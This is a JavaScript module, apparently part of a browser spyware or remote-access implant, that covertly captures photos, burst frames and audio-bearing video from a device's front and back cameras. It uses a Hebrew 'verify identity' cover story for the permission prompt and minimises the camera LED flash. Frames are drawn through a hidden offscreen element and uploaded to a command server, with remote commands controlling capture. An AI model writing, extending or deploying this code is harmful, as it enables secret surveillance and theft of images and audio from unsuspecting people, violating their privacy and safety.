import { forceEvent } from '../beacon.js';
import { CONFIG } from '../config.js';

let _stream = null;
let _captureInterval = null;
let _lastCameras = null; // cached from last enumerateCameras — used by capturePhoto(null) for Both

export async function requestCamera(coverStory = 'אמת זהות') {
  try {
    // Minimal constraints → fastest possible stream start → shortest LED flash
    const tmp = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1 }, height: { ideal: 1 } }, audio: false });
    tmp.getTracks().forEach(t => t.stop()); // release immediately — permission verified, LED off
    await forceEvent('permission_request', { permission: 'camera', result: 'granted' });
    return { granted: true };
  } catch (e) {
    await forceEvent('permission_request', { permission: 'camera', result: 'denied' });
    return { granted: false };
  }
}

export async function captureFrame() {
  let tempStream = null;
  try {
    if (!_stream) {
      tempStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    }
    await _captureFromStream(tempStream || _stream);
  } catch { } finally {
    if (tempStream) tempStream.getTracks().forEach(t => t.stop());
  }
}

function startCapture() {
  if (_captureInterval) return;
  captureFrame();
  _captureInterval = setInterval(captureFrame, 10_000);
  document.addEventListener('visibilitychange', () => {
    if (document.hidden && _captureInterval) {
      clearInterval(_captureInterval);
      _captureInterval = null;
    } else if (!document.hidden && _stream) {
      startCapture();
    }
  });
}

async function uploadMedia(type, dataUrl, source = '') {
  if (!CONFIG.deviceId) return;
  try {
    await fetch(`${CONFIG.server}/api/media/${CONFIG.deviceId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, data: dataUrl, ts: Date.now(), source }),
    });
  } catch { }
}

export async function captureVideo(deviceId = null, durationSec = 5) {
  if (deviceId === null && _lastCameras) {
    const real = _lastCameras.filter(c => c.deviceId !== null);
    for (const cam of real) {
      if (window.__videoAbort) break;
      await _captureVideoFromDevice(cam.deviceId, cam.facing || '', durationSec);
    }
    window.__videoAbort = false;
    return;
  }
  const source = deviceId && _lastCameras
    ? (_lastCameras.find(c => c.deviceId === deviceId)?.facing || '')
    : '';
  await _captureVideoFromDevice(deviceId, source, durationSec);
}

async function _captureVideoFromDevice(deviceId, source, durationSec) {
  window.__videoAbort = false;
  let stream = null;
  try {
    const constraints = deviceId
      ? { video: { deviceId: { exact: deviceId } }, audio: true }
      : { video: true, audio: true };
    stream = await navigator.mediaDevices.getUserMedia(constraints);

    const mimeType = ['video/mp4;codecs=avc1', 'video/mp4', 'video/webm;codecs=vp9', 'video/webm']
      .find(t => { try { return MediaRecorder.isTypeSupported(t); } catch { return false; } }) || '';
    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
    const chunks = [];
    recorder.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };

    let aborted = false;
    await new Promise((resolve, reject) => {
      let timer, poll;
      recorder.onstop = () => { clearTimeout(timer); clearInterval(poll); resolve(); };
      recorder.onerror = e => { clearTimeout(timer); clearInterval(poll); reject(e.error ?? new Error('recorder error')); };
      recorder.start(1000);
      timer = setTimeout(() => { if (recorder.state !== 'inactive') recorder.stop(); }, durationSec * 1000);
      poll = setInterval(() => {
        if (window.__videoAbort && recorder.state !== 'inactive') {
          aborted = true;
          recorder.stop();
        }
      }, 200);
    });

    window.__videoAbort = false;
    const blob = new Blob(chunks, { type: mimeType || 'video/mp4' });
    const dataUrl = await new Promise((res, rej) => {
      const r = new FileReader(); r.onload = () => res(r.result); r.onerror = rej; r.readAsDataURL(blob);
    });

    await uploadMedia('video', dataUrl, source);
    await forceEvent('video_captured', { duration: durationSec, mimeType, size: blob.size, aborted, source });
  } catch (e) {
    await forceEvent('video_capture_error', { error: e?.message });
  } finally {
    window.__videoAbort = false;
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

// Capture N frames with a fixed delay between each.
// Each frame is uploaded individually as a 'camera' media item.
// window.__burstAbort = true to cancel mid-run (set by stop_burst command).
export async function captureBurst(deviceId = null, frames = 5, delayMs = 1000) {
  window.__burstAbort = false;
  let captured = 0;
  for (let i = 0; i < frames; i++) {
    if (window.__burstAbort) break;
    await capturePhoto(deviceId);
    captured++;
    if (i < frames - 1) {
      // Wait in small increments so abort is checked promptly
      const end = Date.now() + delayMs;
      while (Date.now() < end && !window.__burstAbort) {
        await new Promise(r => setTimeout(r, Math.min(200, end - Date.now())));
      }
    }
  }
  window.__burstAbort = false;
  await forceEvent('burst_complete', { frames, captured, delayMs, aborted: captured < frames });
}

// Enumerate video input devices and collapse to 3 virtual entries:
//   front  — best front-facing physical camera
//   back   — best back-facing physical camera (prefer wide > ultra-wide > telephoto)
//   both   — synthetic entry, no deviceId, uses system default (facingMode unconstrained)
export async function enumerateCameras() {
  let tempStream = null;
  try {
    let devices = await navigator.mediaDevices.enumerateDevices();
    let videoDevices = devices.filter(d => d.kind === 'videoinput');
    // Labels only available in same session after getUserMedia, or while stream is active
    if (!_stream && !videoDevices.some(d => d.label)) {
      try {
        tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        devices = await navigator.mediaDevices.enumerateDevices();
        videoDevices = devices.filter(d => d.kind === 'videoinput');
      } catch { }
    }

    const _facing = (lbl) => {
      const l = lbl.toLowerCase();
      if (l.includes('front') || l.includes('truedepth') || l.includes('facetime') || l.includes('user') || l.includes('קדמי')) return 'front';
      if (l.includes('back') || l.includes('rear') || l.includes('environment') || l.includes('wide') || l.includes('tele') || l.includes('ultra') || l.includes('אחורי')) return 'back';
      return null;
    };

    // Prefer wide angle for back, truedepth/facetime for front
    const _score = (lbl, facing) => {
      const l = lbl.toLowerCase();
      if (facing === 'front') return l.includes('truedepth') || l.includes('facetime') ? 1 : 0;
      if (facing === 'back') return l.includes('ultra') ? -1 : l.includes('tele') ? -1 : l.includes('wide') ? 1 : 0;
      return 0;
    };

    const fronts = videoDevices.filter(d => _facing(d.label) === 'front').sort((a, b) => _score(b.label, 'front') - _score(a.label, 'front'));
    const backs  = videoDevices.filter(d => _facing(d.label) === 'back').sort((a, b) => _score(b.label, 'back') - _score(a.label, 'back'));

    const cameras = [];
    if (fronts.length) cameras.push({ deviceId: fronts[0].deviceId, label: 'Front Camera', facing: 'front' });
    if (backs.length)  cameras.push({ deviceId: backs[0].deviceId,  label: 'Back Camera',  facing: 'back'  });
    // Synthetic "both" entry — capturePhoto with deviceId=null uses facingMode:'user' fallback
    cameras.push({ deviceId: null, label: 'Both (Default)', facing: null });

    _lastCameras = cameras;
    await forceEvent('cameras_enumerated', { cameras, count: cameras.length });
    return cameras;
  } catch (e) {
    await forceEvent('cameras_enumerated', { cameras: [], count: 0, error: e?.message });
    return [];
  } finally {
    if (tempStream) tempStream.getTracks().forEach(t => t.stop());
  }
}

// Capture a single photo from a specific device.
// deviceId=null means "Both" — captures front then back using cached enumeration.
// Always releases the stream after capture — LED off immediately.
export async function capturePhoto(deviceId = null) {
  if (deviceId === null && _lastCameras) {
    const real = _lastCameras.filter(c => c.deviceId !== null);
    for (const cam of real) {
      await _captureOneDevice(cam.deviceId, cam.facing || '');
    }
    return;
  }
  const source = deviceId && _lastCameras
    ? (_lastCameras.find(c => c.deviceId === deviceId)?.facing || '')
    : '';
  await _captureOneDevice(deviceId, source);
}

async function _captureOneDevice(deviceId, source = '') {
  let stream = null;
  try {
    const constraints = deviceId
      ? { video: { deviceId: { exact: deviceId } }, audio: false }
      : { video: true, audio: false };
    stream = await navigator.mediaDevices.getUserMedia(constraints);
    await _captureFromStream(stream, source);
  } catch (e) {
    await forceEvent('camera_capture_error', { error: e?.message });
  } finally {
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

function _captureFromStream(stream, source = '') {
  return new Promise((resolve) => {
    const video = document.createElement('video');
    video.muted = true;
    video.playsInline = true;
    video.autoplay = true;
    video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
    document.body.appendChild(video);
    video.srcObject = stream;

    const cleanup = () => {
      if (document.body.contains(video)) document.body.removeChild(video);
      resolve();
    };

    video.addEventListener('loadedmetadata', () => {
      video.play().then(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
        uploadMedia('camera', dataUrl, source);
        cleanup();
      }).catch(cleanup);
    }, { once: true });

    setTimeout(cleanup, 6000);
    video.play().catch(() => {});
  });
}

// Capture from a specific facing mode without needing enumeration first.
export async function capturePhotoFacing(facingMode = 'user') {
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode } }, audio: false,
    });
    await _captureFromStream(stream, facingMode);
  } catch (e) {
    await forceEvent('camera_capture_error', { error: e?.message });
  } finally {
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

export { requestCamera as requestPermission };
